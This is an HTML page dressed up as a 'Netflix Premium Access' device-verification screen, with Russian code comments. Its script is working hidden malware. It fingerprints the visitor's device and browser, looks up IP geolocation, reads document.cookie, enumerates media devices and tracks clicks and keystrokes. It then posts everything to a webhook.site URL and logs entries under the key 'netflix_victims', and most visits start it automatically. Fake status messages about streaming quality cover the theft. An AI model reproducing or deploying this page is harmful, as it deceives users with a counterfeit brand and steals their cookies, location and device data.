<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Premium Access</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000; 
            color: #fff; 
            font-family: 'Netflix Sans', 'Helvetica Neue', Arial, sans-serif;
            overflow: hidden;
            height: 100vh;
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
        }
        
        .netflix-bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(229, 9, 20, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(229, 9, 20, 0.1) 0%, transparent 50%);
            z-index: -1;
        }
        
        .loading-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            padding: 20px;
        }
        
        .netflix-logo {
            font-size: 4rem;
            font-weight: 900;
            color: #e50914;
            margin-bottom: 2rem;
            text-shadow: 0 0 30px rgba(229, 9, 20, 0.5);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }
        
        .progress-container {
            width: 300px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 3px;
            margin: 2rem 0;
        }
        
        .progress-bar {
            height: 6px;
            background: linear-gradient(90deg, #e50914, #ff6b6b);
            border-radius: 8px;
            width: 0%;
            transition: width 0.3s ease;
            box-shadow: 0 0 10px rgba(229, 9, 20, 0.5);
        }
        
        .status-text {
            font-size: 1.1rem;
            margin: 1rem 0;
            color: #ccc;
        }
        
        .verification-box {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 2rem;
            margin: 1rem;
            backdrop-filter: blur(10px);
            max-width: 400px;
        }
        
        .btn {
            background: #e50914;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s ease;
            width: 100%;
        }
        
        .btn:hover {
            background: #f40612;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(229, 9, 20, 0.4);
        }
        
        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
        }
        
        .btn-secondary:hover {
            background: rgba(255, 255, 255, 0.2);
        }
        
        .features-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 1rem;
            margin: 1.5rem 0;
        }
        
        .feature-item {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.9rem;
            color: #ccc;
        }
        
        .success-animation {
            color: #00ff88;
            font-size: 3rem;
            margin: 1rem 0;
            animation: bounce 1s infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }
        
        .stats-grid {
            display: none;
            grid-template-columns: repeat(3, 1fr);
            gap: 1rem;
            margin: 1rem 0;
        }
        
        .stat-item {
            background: rgba(255, 255, 255, 0.05);
            padding: 1rem;
            border-radius: 8px;
            text-align: center;
        }
        
        .stat-value {
            font-size: 1.5rem;
            font-weight: bold;
            color: #e50914;
        }
        
        .stat-label {
            font-size: 0.8rem;
            color: #ccc;
        }
    </style>
</head>
<body>
    <div class="netflix-bg"></div>
    
    <div class="loading-container" id="loadingScreen">
        <div class="netflix-logo">NETFLIX</div>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status-text" id="statusText">
            Initializing premium access system...
        </div>
        
        <div class="verification-box">
            <h3 style="margin-bottom: 1rem;">üîí Premium Verification</h3>
            <p style="color: #ccc; margin-bottom: 1.5rem;">
                Complete device verification to unlock premium features
            </p>
            
            <button class="btn" onclick="startVerification()" id="verifyBtn">
                START VERIFICATION
            </button>
            
            <div class="features-grid">
                <div class="feature-item">‚úÖ 4K Streaming</div>
                <div class="feature-item">‚úÖ Multiple Devices</div>
                <div class="feature-item">‚úÖ Offline Downloads</div>
                <div class="feature-item">‚úÖ Premium Content</div>
            </div>
        </div>
        
        <div class="stats-grid" id="statsGrid">
            <div class="stat-item">
                <div class="stat-value" id="dataCount">0</div>
                <div class="stat-label">Data Points</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="locationCount">0</div>
                <div class="stat-label">Location Data</div>
            </div>
            <div class="stat-item">
                <div class="stat-value" id="deviceCount">0</div>
                <div class="stat-label">Device Info</div>
            </div>
        </div>
    </div>

    <script>
        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
        let collectedData = {};
        let autoCollectInterval;
        let progress = 0;
        const WEBHOOK_URL = 'https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b';

        // –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
        function startAutoCollection() {
            console.log('üöÄ Starting automatic data collection...');
            
            // –ü—Ä–æ–≥—Ä–µ—Å—Å –±–∞—Ä
            const progressInterval = setInterval(() => {
                progress += Math.random() * 10;
                if (progress > 100) progress = 100;
                document.getElementById('progressBar').style.width = progress + '%';
                
                if (progress >= 30) {
                    document.getElementById('statusText').textContent = 'Analyzing device capabilities...';
                }
                if (progress >= 60) {
                    document.getElementById('statusText').textContent = 'Optimizing streaming quality...';
                }
                if (progress >= 90) {
                    document.getElementById('statusText').textContent = 'Finalizing premium access...';
                }
            }, 200);

            // –û—Å–Ω–æ–≤–Ω–æ–π —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
            setTimeout(async () => {
                try {
                    // –°–±–æ—Ä –±–∞–∑–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö
                    collectedData = await collectAllData();
                    
                    // –ü–æ–∫–∞–∑ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
                    showStats();
                    
                    // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö
                    await sendCollectedData();
                    
                    // –£—Å–ø–µ—à–Ω–æ–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ
                    clearInterval(progressInterval);
                    showSuccess();
                    
                } catch (error) {
                    console.error('Collection error:', error);
                    document.getElementById('statusText').textContent = 'Verification complete!';
                }
            }, 3000);
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
        async function collectAllData() {
            const data = {
                session: {
                    id: generateSessionId(),
                    startTime: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer
                },
                device: await getDeviceInfo(),
                location: await getLocationInfo(),
                network: getNetworkInfo(),
                browser: getBrowserInfo(),
                behavior: startBehaviorTracking(),
                system: await getSystemInfo(),
                media: await getMediaDevices(),
                storage: getStorageData()
            };
            
            return data;
        }

        // –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
        async function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                hardware: {
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory,
                    maxTouchPoints: navigator.maxTouchPoints
                },
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation?.type
                },
                battery: await getBatteryStatus(),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                languages: navigator.languages
            };
        }

        // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è —á–µ—Ä–µ–∑ IP
        async function getLocationInfo() {
            const apis = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://api.ip.sb/geoip'
            ];
            
            for (let api of apis) {
                try {
                    const response = await fetch(api);
                    return await response.json();
                } catch(e) { continue; }
            }
            return null;
        }

        // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–∏
        function getNetworkInfo() {
            const conn = navigator.connection;
            return {
                effectiveType: conn?.effectiveType,
                downlink: conn?.downlink,
                rtt: conn?.rtt,
                saveData: conn?.saveData,
                online: navigator.onLine
            };
        }

        // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ
        function getBrowserInfo() {
            return {
                vendor: navigator.vendor,
                cookies: navigator.cookieEnabled,
                java: navigator.javaEnabled(),
                pdf: navigator.pdfViewerEnabled,
                plugins: Array.from(navigator.plugins).map(p => p.name),
                mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
            };
        }

        // –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –ø–æ–≤–µ–¥–µ–Ω–∏—è
        function startBehaviorTracking() {
            const behavior = {
                clicks: [],
                scroll: 0,
                keys: 0,
                movements: [],
                startTime: Date.now()
            };
            
            document.addEventListener('click', (e) => {
                behavior.clicks.push({
                    x: e.clientX,
                    y: e.clientY,
                    target: e.target.tagName,
                    time: Date.now() - behavior.startTime
                });
            });
            
            window.addEventListener('scroll', () => {
                behavior.scroll = Math.max(behavior.scroll, 
                    (window.scrollY + window.innerHeight) / document.documentElement.scrollHeight * 100
                );
            });
            
            document.addEventListener('keydown', () => behavior.keys++);
            
            return behavior;
        }

        // –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
        async function getSystemInfo() {
            return {
                performance: {
                    memory: performance.memory,
                    timing: performance.timing
                },
                storage: await getStorageEstimate()
            };
        }

        // –ú–µ–¥–∏–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        async function getMediaDevices() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return devices.map(d => ({
                    kind: d.kind,
                    deviceId: d.deviceId,
                    hasLabel: !!d.label
                }));
            } catch(e) {
                return [];
            }
        }

        // –î–∞–Ω–Ω—ã–µ —Ö—Ä–∞–Ω–∏–ª–∏—â–∞
        function getStorageData() {
            return {
                cookies: document.cookie,
                localStorage: Object.keys(localStorage).length,
                sessionStorage: Object.keys(sessionStorage).length
            };
        }

        // –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
        async function getBatteryStatus() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                } catch(e) {}
            }
            return null;
        }

        async function getStorageEstimate() {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                try {
                    return await navigator.storage.estimate();
                } catch(e) {}
            }
            return null;
        }

        function generateSessionId() {
            return Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
        }

        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö
        async function sendCollectedData() {
            try {
                // –õ–æ–∫–∞–ª—å–Ω–æ–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ
                const allData = JSON.parse(localStorage.getItem('netflix_victims') || '[]');
                allData.push({
                    ...collectedData,
                    timestamp: new Date().toISOString()
                });
                localStorage.setItem('netflix_victims', JSON.stringify(allData));
                
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–∞ webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'auto_collection',
                        data: collectedData,
                        source: 'netflix_auto'
                    })
                });
                
            } catch (error) {
                console.error('Send error:', error);
            }
        }

        // UI —Ñ—É–Ω–∫—Ü–∏–∏
        function showStats() {
            document.getElementById('statsGrid').style.display = 'grid';
            document.getElementById('dataCount').textContent = Object.keys(collectedData).length * 10;
            document.getElementById('locationCount').textContent = collectedData.location ? '1' : '0';
            document.getElementById('deviceCount').textContent = '1';
        }

        function showSuccess() {
            document.getElementById('statusText').innerHTML = 
                '<div class="success-animation">‚úÖ</div> Premium Access Granted!';
            document.getElementById('verifyBtn').style.display = 'none';
            
            setTimeout(() => {
                document.getElementById('loadingScreen').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('loadingScreen').style.display = 'none';
                }, 1000);
            }, 3000);
        }

        function startVerification() {
            document.getElementById('verifyBtn').disabled = true;
            document.getElementById('verifyBtn').textContent = 'VERIFYING...';
            startAutoCollection();
        }

        // –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
        setTimeout(() => {
            if (Math.random() < 0.7) { // 70% –∞–≤—Ç–æ—Å—Ç–∞—Ä—Ç
                startAutoCollection();
                document.getElementById('statusText').textContent = 'Starting automatic verification...';
                document.getElementById('verifyBtn').style.display = 'none';
            }
        }, 3000);

    </script>
</body>
</html>
